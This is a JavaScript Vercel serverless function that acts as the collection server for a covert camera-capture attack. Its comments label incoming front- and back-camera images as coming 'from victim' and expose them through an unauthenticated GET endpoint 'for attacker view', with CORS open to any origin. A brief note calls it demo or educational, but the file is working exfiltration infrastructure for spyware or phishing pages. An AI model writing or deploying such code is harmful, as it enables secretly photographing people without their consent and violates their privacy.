// api/capture.js
// Vercel serverless function for storing/retrieving captured images

// In-memory storage (Vercel uses stateless functions, so we use a global)
// Note: For production, use a database. For demo/edu, this works within a single instance.
let imageStore = {
    front: null,
    back: null
};

export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // POST - Save image from victim
    if (req.method === 'POST') {
        try {
            const { image, camera, timestamp } = req.body;
            
            if (!image || !camera) {
                return res.status(400).json({ error: 'Missing image or camera type' });
            }

            // Store the image
            if (camera === 'front') {
                imageStore.front = { image, timestamp: timestamp || Date.now() };
            } else if (camera === 'back') {
                imageStore.back = { image, timestamp: timestamp || Date.now() };
            }

            console.log(`✅ ${camera} camera image captured at ${new Date().toISOString()}`);
            
            return res.status(200).json({ 
                success: true, 
                message: `Image captured from ${camera} camera` 
            });
        } catch (error) {
            console.error('Error saving image:', error);
            return res.status(500).json({ error: 'Failed to save image' });
        }
    }

    // GET - Fetch images (for attacker view)
    if (req.method === 'GET') {
        return res.status(200).json(imageStore);
    }

    return res.status(405).json({ error: 'Method not allowed' });
}
